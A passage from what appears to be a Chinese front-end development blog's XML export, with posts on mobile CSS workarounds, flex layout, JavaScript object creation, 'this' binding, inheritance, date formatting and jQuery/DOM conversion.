90:alert("横屏:" + window.orientation);case 0:case 180:alert("竖屏:" + window.orientation);break;&#125;&#125;样式//竖屏时使用的样式123@media all and (orientation:portrait) &#123;.css&#123;&#125;&#125;//横屏时使用的样式123@media all and (orientation:landscape) &#123;.css&#123;&#125;&#125;audio元素和video元素在ios和andriod中无法自动播放应对方案：触屏即播123$('html').one('touchstart',function()&#123;audio.play()&#125;)摇一摇功能HTML5 deviceMotion：封装了运动传感器数据的事件，可以获取手机运动状态下的运动加速度等数据。手机拍照和上传图片1&lt;input type="file"&gt;accept 属性1234&lt;!-- 选择照片 --&gt;&lt;input type=file accept="image/*"&gt;&lt;!-- 选择视频 --&gt;&lt;input type=file accept="video/*"&gt;使用总结：&emsp;&emsp;ios 有拍照、录像、选取本地图片功能，部分android只有选取本地图片功能，winphone不支持input控件默认外观丑陋&emsp;&emsp;微信浏览器用户调整字体大小后页面矬了，怎么阻止用户调整原因&emsp;&emsp;anroid侧是复写了layoutinflater对textview做了统一处理ios侧是修改了body.style.webkitTextSizeAdjust值普通解决方案：android暂无方案ios使用-webkit-text-size-adjust禁止调整字体大小body{-webkit-text-size-adjust: 100%!important;}最好的解决方案：整个页面用rem或者百分比布局消除transition闪屏网络都是这么写的，但我并没有测试出来123456.css&#123;/*设置内嵌的元素在 3D 空间如何呈现：保留 3D*/-webkit-transform-style: preserve-3d;/*（设置进行转换的元素的背面在面对用户时是否可见：隐藏）*/-webkit-backface-visibility: hidden;&#125;开启硬件加速解决页面闪白,保证动画流畅123456.css &#123;-webkit-transform: translate3d(0, 0, 0);-moz-transform: translate3d(0, 0, 0);-ms-transform: translate3d(0, 0, 0);transform: translate3d(0, 0, 0);&#125;取消input在ios下，输入的时候英文首字母的默认大写1&lt;input autocapitalize="off" autocorrect="off" /&gt;android 上去掉语音输入按钮1input::-webkit-input-speech-button &#123;display: none&#125;&emsp;&emsp;android 2.3 bug，@-webkit-keyframes需要以0%开始100%结束，0%的百分号不能去掉after和before伪类无法使用动画，border-radius不支持%单位translate百分比的写法和scale在一起会导致失效，例如1-webkit-transform: translate(-50%,-50%) scale(-0.5, 1)&emsp;&emsp;android 4.x bug三星GalaxyS4中自带浏览器不支持border-radius缩写，同时设置border-radius和背景色的时候，背景色会溢出到圆角以外部分，部分手机(如三星)，a链接支持鼠标:visited事件，也就是说链接访问后文字变为紫色设计高性能CSS3动画的几个要素&emsp;&emsp;尽可能地使用合成属性transform和opacity来设计CSS3动画，不使用position的left和top来定位fixed bug&emsp;&emsp;ios下fixed元素容易定位出错，软键盘弹出时，影响fixed元素定位&emsp;&emsp;android下fixed表现要比iOS更好，软键盘弹出时，不会影响fixed元素定位ios4下不支持position:fixed解决方案可用isroll.js，暂无完美方案如何阻止windows Phone的默认触摸事件winphone下默认触摸事件事件使用e.preventDefault是无效的目前解决方法是使用样式来禁用1html&#123;-ms-touch-action: none;&#125;/* 禁止winphone默认触摸事件 */常用的移动端框架zepto.js语法与jquery几乎一样，会jquery基本会zepto~最新版本已经更新到1.16官网：http://zeptojs.com/中文(非官网)：http://www.css88.com/doc/zeptojs_api/常使用的扩展模块：浏览器检测：https://github.com/madrobby/zepto/blob/master/src/detect.jstap事件：https://github.com/madrobby/zepto/blob/master/src/touch.jsiscroll.js解决页面不支持弹性滚动，不支持fixed引起的问题~实现下拉刷新，滑屏，缩放等功能~最新版本已经更新到5.0官网：http://cubiq.org/iscroll-5underscore.js笔者没用过，不过听说好用，推荐给大家~该库提供了一整套函数式编程的实用功能，但是没有扩展任何JavaScript内置对象。最新版本已经更新到1.8.2官网：http://underscorejs.org/滑屏框架适合上下滑屏、左右滑屏等滑屏切换页面的效果slip.jsiSlider.jsfullpage.jsflex布局flex布局目前可使用在移动中，并非所有的语法都全兼容，但以下写法笔者实践过，效果良好~flex：定义布局为盒模型flex-v：盒模型垂直布局flex-1：子元素占据剩余的空间flex-align-center：子元素垂直居中flex-pack-center：子元素水平居中flex-pack-justify：子元素两端对齐兼容性：ios 4+、android 2.3+、winphone8+123456.flex&#123;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;&#125;.flex-v&#123;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;&#125;.flex-1&#123;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;&#125;.flex-align-center&#123;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;&#125;.flex-pack-center&#123;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;&#125;.flex-pack-justify&#123;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;&#125;示例：两端对齐1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable"&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt;&lt;meta content="telephone=no" name="format-detection"&gt;&lt;meta content="email=no" name="format-detection"&gt;&lt;style type="text/css"&gt;/* ============================================================flex：定义布局为盒模型flex-v：盒模型垂直布局flex-1：子元素占据剩余的空间flex-align-center：子元素垂直居中flex-pack-center：子元素水平居中flex-pack-justify：子元素两端对齐兼容性：ios 4+、android 2.3+、winphone8+============================================================ */.flex&#123;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;&#125;.flex-v&#123;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;&#125;.flex-1&#123;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;&#125;.flex-align-center&#123;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;&#125;.flex-pack-center&#123;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;&#125;.flex-pack-justify&#123;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="flex flex-pack-justify"&gt;&lt;div&gt;模块一&lt;/div&gt;&lt;div&gt;模块二&lt;/div&gt;&lt;div&gt;模块三&lt;/div&gt;&lt;div&gt;模块四&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动前端开发知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript高级程序设计（创建对象）]]></title>
    <url>%2F2015%2F08%2F03%2Fjavascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%EF%BC%88%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一：工厂模式123456789function createPerson(name,age,job)&#123;var o = new Object();o.name = name;o.age = age;o.sayName = function()&#123;console.log(this.name);&#125;return o;&#125;//创建对象： var person = createPerson(“Tom”,10,”student”);二：构造函数模式12345678function Person(name,age,job)&#123;this.name = name;this.age = age;this.job = job;this.sayName = function&#123;console.log(this.name);&#125;&#125;//创建对象： var person = new Person(“Peter”,20,”engineer”);//没有显示地创建对象；直接将属性和方法赋给了this对象；没有return 语句；//使用new 来创建实例对象(1.创建一个新对象2.将构造函数的作用域赋给新对象,即this指向新对象3.执行构造函数中的代码 4.返回新对象)三：原型模式12345function Person()&#123;&#125;Person.prototype.name = "Mary";Person.prototype.age = 18;Person.prototype.job = "teacher";Person.prototype.sayName = function()&#123;console.log(this.name);&#125;//创建对象：var person = new Person();四：组合使用构造函数模式和原型模式1234567891011function Person(name,age,job)&#123;this.name = name;this.age = age;this.job = job;this.friends = ["tom","peter"];&#125;Person.prototype = &#123;constructor:Person, //以这种方式重写原型链需要绑定constructor，让其prototype重新指向personsayName : function()&#123;console.log(this.name);&#125;&#125;五：动态原型模式123456789101112function Person(name,age,job)&#123;//Attributethis.name = name;this.age = age;this.job = job;//methodif(typeof this.sayName != "function")&#123;//判断如果不存在sayName方法就在原型链上添加此方法，这里对原型所做的修改能立即在所有实例中得到反映Person.prototype.sayName = function()&#123;console.log(this.name);&#125;;&#125;&#125;六：寄生构造函数模式12345678910function Person(name,age,job)&#123;var o = new Object();o.name = name;o.age = age;o.job = job;o.sayName = function()&#123;console.log(this.name);&#125;return o;&#125;//发挥的对象与构造函数或者与构造函数的原型属性之间没有关系，不能依赖instanceof操作符来确定对象类型七：稳妥构造函数模式12345function Person(name,age,job)&#123;var o = new Object();o.sayName = function()&#123;console.log(this.name);&#125;;return o;&#125;//创建对象：var friend = Person(“Tom”,29,”eigneer”);//只能通过调用sayName方法获得name的值，安全性高&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js创建对象</tag>
        <tag>js设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Js中的this的用法详解]]></title>
    <url>%2F2015%2F08%2F03%2Fjs%E4%B8%AD%E7%9A%84this%E7%9A%84%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[由于其运行期绑定的特性，JavaScript 中的 this 含义要丰富得多，它可以是全局对象、当前对象或者任意对象，这完全取决于函数的调用方式。JavaScript 中函数的调用有以下几种方式：作为对象方法调用，作为函数调用，作为构造函数调用，和使用 apply 或 call 调用。下面我们将按照调用方式的不同，分别讨论 this 的含义。作为对象方法调用在 JavaScript 中，函数也是对象，因此函数可以作为一个对象的属性，此时该函数被称为该对象的方法，在使用这种调用方式时，this 被自然绑定到该对象。12345678910var point = &#123;x : 0,y : 0,moveTo : function(x, y) &#123;this.x = this.x + x;this.y = this.y + y;&#125;&#125;;point.moveTo(1, 1)//this 绑定到当前对象，即 point 对象&nbsp;作为函数调用函数也可以直接被调用，此时 this 绑定到全局对象。在浏览器中，window 就是该全局对象。比如下面的例子：函数被调用时，this 被绑定到全局对象，接下来执行赋值语句，相当于隐式的声明了一个全局变量，这显然不是调用者希望的。123456function makeNoSense(x) &#123;this.x = x;&#125;makeNoSense(5);x;// x 已经成为一个值为 5 的全局变量对于内部函数，即声明在另外一个函数体内的函数，这种绑定到全局对象的方式会产生另外一个问题。我们仍然以前面提到的 point 对象为例，这次我们希望在 moveTo 方法内定义两个函数，分别将 x，y 坐标进行平移。结果可能出乎大家意料，不仅 point 对象没有移动，反而多出两个全局变量 x，y。12345678910111213141516171819202122var point = &#123;x : 0,y : 0,moveTo : function(x, y) &#123;// 内部函数var moveX = function(x) &#123;this.x = x;//this 绑定到了哪里？&#125;;// 内部函数var moveY = function(y) &#123;this.y = y;//this 绑定到了哪里？&#125;;moveX(x);moveY(y);&#125;&#125;;point.moveTo(1, 1);point.x; //==&gt;0point.y; //==&gt;0x; //==&gt;1y; //==&gt;1这属于 JavaScript 的设计缺陷，正确的设计方式是内部函数的 this 应该绑定到其外层函数对应的对象上，为了规避这一设计缺陷，聪明的 JavaScript 程序员想出了变量替代的方法，约定俗成，该变量一般被命名为 that。1234567891011121314151617181920var point = &#123;x : 0,y : 0,moveTo : function(x, y) &#123;var that = this;// 内部函数var moveX = function(x) &#123;that.x = x;&#125;;// 内部函数var moveY = function(y) &#123;that.y = y;&#125;moveX(x);moveY(y);&#125;&#125;;point.moveTo(1, 1);point.x; //==&gt;1point.y; //==&gt;1&nbsp;作为构造函数调用JavaScript 支持面向对象式编程，与主流的面向对象式编程语言不同，JavaScript 并没有类（class）的概念，而是使用基于原型（prototype）的继承方式。相应的，JavaScript 中的构造函数也很特殊，如果不使用 new 调用，则和普通函数一样。作为又一项约定俗成的准则，构造函数以大写字母开头，提醒调用者使用正确的方式调用。如果调用正确，this 绑定到新创建的对象上。1234function Point(x, y)&#123;this.x = x;this.y = y;&#125;&nbsp;使用 apply 或 call 调用让我们再一次重申，在 JavaScript 中函数也是对象，对象则有方法，apply 和 call 就是函数对象的方法。这两个方法异常强大，他们允许切换函数执行的上下文环境（context），即 this 绑定的对象。很多 JavaScript 中的技巧以及类库都用到了该方法。让我们看一个具体的例子：12345678910111213function Point(x, y)&#123;this.x = x;this.y = y;this.moveTo = function(x, y)&#123;this.x = x;this.y = y;&#125;&#125;var p1 = new Point(0, 0);var p2 = &#123;x: 0, y: 0&#125;;p1.moveTo(1, 1);p1.moveTo.apply(p2, [10, 10]);在上面的例子中，我们使用构造函数生成了一个对象 p1，该对象同时具有 moveTo 方法；使用对象字面量创建了另一个对象 p2，我们看到使用 apply 可以将 p1 的方法应用到 p2 上，这时候 this 也被绑定到对象 p2 上。另一个方法 call 也具备同样功能，不同的是最后的参数不是作为一个数组统一传入，而是分开传入的。换个角度理解&nbsp;函数的执行环境JavaScript 中的函数既可以被当作普通函数执行，也可以作为对象的方法执行，这是导致 this 含义如此丰富的主要原因。一个函数被执行时，会创建一个执行环境（ExecutionContext），函数的所有的行为均发生在此执行环境中，构建该执行环境时，JavaScript 首先会创建 arguments变量，其中包含调用函数时传入的参数。接下来创建作用域链。然后初始化变量，首先初始化函数的形参表，值为 arguments变量中对应的值，如果 arguments变量中没有对应值，则该形参初始化为 undefined。如果该函数中含有内部函数，则初始化这些内部函数。如果没有，继续初始化该函数内定义的局部变量，需要注意的是此时这些变量初始化为 undefined，其赋值操作在执行环境（ExecutionContext）创建成功后，函数执行时才会执行，这点对于我们理解 JavaScript 中的变量作用域非常重要，鉴于篇幅，我们先不在这里讨论这个话题。最后为 this变量赋值，如前所述，会根据函数调用方式的不同，赋给 this全局对象，当前对象等。至此函数的执行环境（ExecutionContext）创建成功，函数开始逐行执行，所需变量均从之前构建好的执行环境（ExecutionContext）中读取。Function.bind有了前面对于函数执行环境的描述，我们来看看 this 在 JavaScript 中经常被误用的一种情况：回调函数。JavaScript 支持函数式编程，函数属于一级对象，可以作为参数被传递。请看下面的例子 myObject.handler 作为回调函数，会在 onclick 事件被触发时调用，但此时，该函数已经在另外一个执行环境（ExecutionContext）中执行了，this 自然也不会绑定到 myObject 对象上。1button.onclick = myObject.handler;这是 JavaScript 新手们经常犯的一个错误，为了避免这种错误，许多 JavaScript 框架都提供了手动绑定 this 的方法。比如 Dojo 就提供了 lang.hitch，该方法接受一个对象和函数作为参数，返回一个新函数，执行时 this 绑定到传入的对象上。使用 Dojo，可以将上面的例子改为：1button.onclick = lang.hitch(myObject, myObject.handler);在新版的 JavaScript 中，已经提供了内置的 bind 方法供大家使用。&nbsp;eval 方法JavaScript 中的 eval 方法可以将字符串转换为 JavaScript 代码，使用 eval 方法时，this 指向哪里呢？答案很简单，看谁在调用 eval 方法，调用者的执行环境（ExecutionContext）中的 this 就被 eval 方法继承下来了。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js中this</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[控制锚点定位方法总结]]></title>
    <url>%2F2015%2F08%2F02%2F%E6%8E%A7%E5%88%B6%E9%94%9A%E7%82%B9%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[一、HTML方法1、最好是name和id都是st。避免有些特殊情况12&lt;a href="#firstAnchor" target="_blank"&gt;跳转到st&lt;/a&gt;&lt;a name="firstAnchor"&gt;&lt;/a&gt;2、iframe通过锚点控制父页面的位置iframe通过锚点控制父页面的位置,答案就是在iframe中的子页面中加上代码：注意 这里的’top’是父级页面的锚点名称二、js方法&emsp;&emsp;但对于js呢，在js中如何在完成一个操作后跳至页面的某个固定锚点呢js中location.href可以跳转至某个url；&emsp;&emsp;跳至（定位到）某个固定锚点的办法1、location.href = “#firstAnchor”; // firstAnchor为锚点名称2、window.location.hash = firstAnchor; // firstAnchor为锚点名称三、Jq方法1、代码$(“body,html”).animate({scrollTop:$(“xxx”).offset().top});2、解释(1)、兼容性能：$(“body,html”)中的“body”支持safari浏览器，”html”支持FF、IE、OPERA…；(2)、$(“xxx”).offset().top 为获得要锚点处在当前视口的高度相对偏移]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>jq锚点</tag>
        <tag>js锚点</tag>
        <tag>控制锚点定位</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现继承方式的总结详解]]></title>
    <url>%2F2015%2F08%2F01%2Fjs%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F%E7%9A%84%E6%80%BB%E7%BB%93%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[js是门灵活的语言，实现一种功能往往有多种做法,ECMAScript没有明确的继承机制，而是通过模仿实现的，根据js语言的本身的特性,js实现继承有以下通用的几种方式1、使用对象冒充实现继承(该种实现方式可以实现多继承)实现原理:让父类的构造函数成为子类的方法,然后调用该子类的方法,通过this关键字给所有的属性和方法赋值12345678910111213141516171819202122function Parent(firstname)&#123; this.fname=firstname; this.age=40; this.sayAge=function() &#123; console.log(this.age); &#125;&#125;function Child(firstname)&#123; this.parent=Parent; this.parent(firstname); delete this.parent; this.saySomeThing=function() &#123; console.log(this.fname); this.sayAge(); &#125;&#125;var mychild=new Child("李");mychild.saySomeThing();2、采用call方法改变函数上下文实现继承(该种方式不能继承原型链,若想继承原型链，则采用5混合模式)实现原理:改变函数内部的函数上下文this,使它指向传入函数的具体对象1234567891011121314151617181920212223242526function Parent(firstname)&#123; this.fname=firstname; this.age=40; this.sayAge=function() &#123; console.log(this.age); &#125;&#125;function Child(firstname)&#123; this.saySomeThing=function() &#123; console.log(this.fname); this.sayAge(); &#125; this.getName=function() &#123; return firstname; &#125;&#125;var child=new Child("张");Parent.call(child,child.getName());child.saySomeThing();3、采用Apply方法改变函数上下文实现继承(该种方式不能继承原型链,若想继承原型链，则采用5混合模式)实现原理:改变函数内部的函数上下文this,使它指向传入函数的具体对象1234567891011121314151617181920212223242526function Parent(firstname)&#123; this.fname=firstname; this.age=40; this.sayAge=function() &#123; console.log(this.age); &#125;&#125;function Child(firstname)&#123; this.saySomeThing=function() &#123; console.log(this.fname); this.sayAge(); &#125; this.getName=function() &#123; return firstname; &#125;&#125;var child=new Child("张");Parent.apply(child,[child.getName()]);child.saySomeThing();4、采用原型链的方式实现继承实现原理:使子类原型对象指向父类的实例以实现继承,即重写类的原型,弊端是不能直接实现多继承12345678910111213141516171819202122function Parent()&#123; this.sayAge=function() &#123; console.log(this.age); &#125;&#125;function Child(firstname)&#123; this.fname=firstname; this.age=40; this.saySomeThing=function() &#123; console.log(this.fname); this.sayAge(); &#125;&#125;Child.prototype=new Parent();var child=new Child("张");child.saySomeThing();5、采用混合模式实现继承123456789101112131415161718192021222324252627282930function Parent()&#123; this.sayAge=function() &#123; console.log(this.age); &#125;&#125;Parent.prototype.sayParent=function()&#123; alert("this is parentmethod!!!");&#125;function Child(firstname)&#123; Parent.call(this); this.fname=firstname; this.age=40; this.saySomeThing=function() &#123; console.log(this.fname); this.sayAge(); &#125;&#125;Child.prototype=new Parent();var child=new Child("张");child.saySomeThing();child.sayParent();&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js继承</tag>
        <tag>js继承总结</tag>
        <tag>js继承详解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端如何使用css让百分比布局的弹窗水平和垂直方向上居中]]></title>
    <url>%2F2015%2F07%2F31%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8css%E8%AE%A9%E7%99%BE%E5%88%86%E6%AF%94%E5%B8%83%E5%B1%80%E7%9A%84%E5%BC%B9%E7%AA%97%E6%B0%B4%E5%B9%B3%E5%92%8C%E5%9E%82%E7%9B%B4%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;pc端让一个弹窗水平和垂直方向居中，在知道弹窗宽高的情况下很好计算，只需要用如下css即可：123456789#date&#123; width: 300px; height: 300px; position: absolute; top: 50%; left: 50%; margin-left: -150px; margin-top: -150px;&#125;&emsp;&emsp;但是到了移动端，如果写百分比布局的话，高度不好确定，所以弹窗居中就会变得困难，今天遇到这个问题，百度了一下，看到这位朋友的资料，这位朋友的css代码如下：1234567891011.center&#123; width:50%; height:30%; position: absolute; top: 50%; left: 50%; -moz-transform: translate(-50%, -50%); -ms-transform: translate(-50%, -50%); -webkit-transform: translate(-50%, -50%); transform: translate(-50%, -50%);&#125;试了一下，可以得到想要的效果，&emsp;&emsp;但是如果我们在不确定高度的情况下，把height：30%去掉，不设置height的值，会发现弹窗会根据自己的内容来实现垂直方向居中，主要css代码如下：12345678910.center&#123; width:50%; position: absolute; top: 50%; left: 50%; -moz-transform: translate(-50%, -50%); -ms-transform: translate(-50%, -50%); -webkit-transform: translate(-50%, -50%); transform: translate(-50%, -50%);&#125;效果如下(弹窗部分为灰色背景区域)：&emsp;&emsp;这样就可以很好的得到自己想要的，水平和垂直方向上都居中的弹窗效果拉，大家可以试下~&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端垂直居中</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript日期格式化]]></title>
    <url>%2F2015%2F07%2F31%2Fjavascript%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%2F</url>
    <content type="text"><![CDATA[为Javascript的Date类型增加原型方法，以便日期格式化；1234567891011121314151617181920Date.prototype.format = function(format)&#123;var o = &#123;"M+" : this.getMonth()+1, //month"d+" : this.getDate(), //day"h+" : this.getHours(), //hour"m+" : this.getMinutes(), //minute"s+" : this.getSeconds(), //second"q+" : Math.floor((this.getMonth()+3)/3), //quarter"S" : this.getMilliseconds() //millisecond&#125;if(/(y+)/.test(format)) &#123;format = format.replace(RegExp.$1, (this.getFullYear()+"").substr(4 - RegExp.$1.length));&#125;for(var k in o) &#123;if(new RegExp("("+ k +")").test(format)) &#123;format = format.replace(RegExp.$1, RegExp.$1.length==1 ? o[k] : ("00"+ o[k]).substr((""+ o[k]).length));&#125;&#125;return format;&#125;开始调用：1234alert(new Date().Format("yyyy年MM月dd日")); alert(new Date().Format("MM/dd/yyyy")); alert(new Date().Format("yyyyMMdd")); alert(new Date().Format("yyyy-MM-dd hh:mm:ss"));&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js日期格式化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么遍历数组元素最好使用for而不是for in]]></title>
    <url>%2F2015%2F07%2F31%2F%E4%B8%BA%E4%BB%80%E4%B9%88%E9%81%8D%E5%8E%86%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0%E6%9C%80%E5%A5%BD%E4%BD%BF%E7%94%A8for%E8%80%8C%E4%B8%8D%E6%98%AFfor-in%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在JavaScript中，严格来说所有的数据类型鼻祖都是Object，所以我们来看看以下这个例子：12345678910var arr = ["a", "b", "c"];undefined&gt;&gt;&gt; for(var i=0; i&lt;arr.length; i++)&#123; console.log(i); &#125; 012 &gt;&gt;&gt; for(var i in arr)&#123; console.log(i); &#125;012&emsp;&emsp;以上例子定义了一个包含3个元素的数组arr，然后分别使用for和for-in来遍历它的元素，结果都没问题。但如果我给arr添加一个原型方法，结果就不一样了。1234Array.prototype.len = function()&#123; return this.length; &#125;;function()&gt;&gt;&gt; arr.len()3&emsp;&emsp;给数组原型添加了一个自定义len方法，然后再使用for和for-in来遍历它123456789for(var i=0; i&lt;arr.length; i++)&#123; console.log(i); &#125; 0 1 2 &gt;&gt;&gt; for(var i in arr)&#123; console.log(i); &#125;012len&emsp;&emsp;for循环没问题，但for-in却把我们自定义的len方法也给遍历出来了，可是arr.length还是等于3。这说明for-in会把Array当做一个Object来遍历所有成员包含Array的元素，len做为arr的成员自然也就被遍历出来。&emsp;&emsp;然后有人就说，那我不给数组添加原型方法，那用for-in就没问题，可是你又敢保证有人不这么干吗？1234var arr = [];undefined&gt;&gt;&gt; arr.id = Date.now()1390099868440包括String类型同样使用for-in要注意，看下面例子：12345678910111213141516171819var str = "qttc";undefined&gt;&gt;&gt; String.prototype.lastChar = function()&#123; return this.charAt(this.length-1) &#125;function()&gt;&gt;&gt; str.lastChar()"c"&gt;&gt;&gt; str.length4&gt;&gt;&gt; for(var i=0; i&lt;str.length; i++)&#123; console.log(i); &#125; 0 1 2 3 &gt;&gt;&gt; for(var i in str)&#123; console.log(i); &#125;0123lastChar&emsp;&emsp;这个例子很好的说明了for与for-in的区别，所以反过来你想要知道某个String或者Array或者任意类型的对象被添加了什么方法都可以使用for-in获得，for-in是最彻底的。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>for遍历数组元素</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery对象与（js）dom对象相互转换]]></title>
    <url>%2F2015%2F07%2F31%2Fjquery%E5%AF%B9%E8%B1%A1%E4%B8%8E%EF%BC%88js%EF%BC%89dom%E5%AF%B9%E8%B1%A1%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[核心提示：jquery选择器得到的jquery对象和标准的javascript中的document.getElementById()取得的dom对象是两种不同的对象类型，一般情况下，如S(’#id’)得到的是jquery对象，它不能使用js中的dom方法。所以，如果jquery对象要使用标准的dom方法，就需要进行对象转换。刚开始学习jQuery，可能一时会分不清楚哪些是jQuery对象，哪些是DOM对象。至于DOM对象不多解释，我们接触的太多了，下面重点介绍一下jQuery，以及两者相互间的转换。什么是jQuery对象？—就是通过jQuery包装DOM对象后产生的对象。jQuery对象是jQuery独有的，其可以使用jQuery里的方法。比如：$(“#test”).html() 意思是指：获取ID为test的元素内的html代码。其中html()是jQuery里的方法这段代码等同于用DOM实现代码：1document.getElementById("id").innerHTML;虽然jQuery对象是包装DOM对象后产生的，但是jQuery无法使用DOM对象的任何方法，同理DOM对象也不能使用jQuery里的方法. 乱使用会报错。比如：$(“#test”).innerHTML、document.getElementById(“id”).html()之类的写法都是错误的。还有一个要注意的是：用#id作为选择符取得的是jQuery对象与document.getElementById(“id”)得到的DOM对象，这两者并不等价。请参看如下说的两者间的转换。既然jQuery有区别但也有联系，那么jQuery对象与DOM对象也可以相互转换。在再两者转换前首先我们给一个约定：如果一个获取的是 jQuery对象，那么我们在变量前面加上$，如：var $variab = jQuery对象；如果获取的是DOM对象，则与习惯普通一样：var variab = DOM对象；这么约定只是便于讲解与区别，实际使用中并不规定。jQuery对象转成DOM对象：两种转换方式将一个jQuery对象转换成DOM对象：[index]和.get(index);(1)jQuery对象是一个数据对象，可以通过[index]的方法，来得到相应的DOM对象。比如：123var $v =$("#v") ; //jQuery对象var v=$v[0]; //DOM对象alert(v.checked) //检测这个checkbox是否被选中(2)jQuery本身提供，通过.get(index)方法，得到相应的DOM对象比如：123var $v=$("#v"); //jQuery对象var v=$v.get(0); //DOM对象alert(v.checked) //检测这个checkbox是否被选中DOM对象转成jQuery对象:对于已经是一个DOM对象，只需要用$()把DOM对象包装起来，就可以获得一个jQuery对象了。$(DOM对象)比如：12var v=document.getElementById("v"); //DOM对象var $v=$(v); //jQuery对象转换后，就可以任意使用jQuery的方法了。通过以上方法，可以任意的相互转换jQuery对象和DOM对象。需要再强调注意的是：DOM对象才能使用DOM中的方法，jQuery对象是不可以用DOM中的方法。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jq转dom对象</tag>
        <tag>jq转js</tag>
        <tag>js转jq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS快速获取图片宽高的方法]]></title>
    <url>%2F2015%2F07%2F31%2Fjs%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[快速获取图片的宽高其实是为了预先做好排版样式布局做准备，通过快速获取图片宽高的方法比onload方法要节省很多时间，甚至一分钟以上都有可能，并且这种方法适用主流浏览器包括IE低版本浏览器。一、简陋的获取图片方式12345678// 图片地址 后面加时间戳是为了避免缓存var img_url = ‘http://www.qttc.net/static/upload/2013/13643608813441.jpg?’+Date.parse(new Date());// 创建对象var img = new Image();// 改变图片的srcimg.src = img_url;// 打印alert(‘width:’+img.width+‘,height:’+img.height);结果如下：宽高都是0的这个结果很正常，因为图片的相关数据都没有被加载前它的宽高默认就是0 于是可以这么优化！&nbsp;二、onload后在打印1234567891011// 图片地址 后面加时间戳是为了避免缓存var img_url = ‘http://www.qttc.net/static/upload/2013/13643608813441.jpg?’+Date.parse(new Date());// 创建对象var img = new Image();// 改变图片的srcimg.src = img_url;// 加载完成执行img.onload = function()&#123;// 打印alert(‘width:’+img.width+‘,height:’+img.height);&#125;;结果如下:通过onload就能获取到图片的宽高了。但onload大一点的图通常都比较慢，不实用，但只要图片被浏览器缓存，那么图片加载几乎就不用等待即可触发onload，我们要的是占位符。所以有些人通过缓存获取也可以这么写。&nbsp;三、通过complete与onload一起混合使用为了测试缓存效果，注意以下测试图片的url都不加时间戳1234567891011121314151617// 图片地址var img_url = ‘http://www.qttc.net/static/upload/2013/13643608813441.jpg’;// 创建对象var img = new Image();// 改变图片的srcimg.src = img_url;// 判断是否有缓存if(img.complete)&#123;// 打印alert(‘from:complete : width:’+img.width+‘,height:’+img.height);&#125;else&#123;// 加载完成执行img.onload = function()&#123;// 打印alert(‘from:onload : 